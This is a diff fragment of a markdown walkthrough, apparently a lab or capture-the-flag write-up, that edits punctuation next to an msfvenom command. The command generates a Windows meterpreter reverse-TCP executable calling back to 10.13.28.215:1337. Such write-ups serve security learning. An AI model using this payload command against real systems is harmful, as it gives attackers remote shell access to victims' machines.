@@ -93,7 +93,7 @@ So what I decided to do is RDP into the box with our same credentials and upload
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691398526561/f18a5b32-ae22-4469-b5c9-49e5096bf9e5.png align="center")
 
-Generate a payload using `msfvenom`:
+Generate a payload using `msfvenom`.
 
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.28.215 LPORT=1337 -f exe -o payload.exe
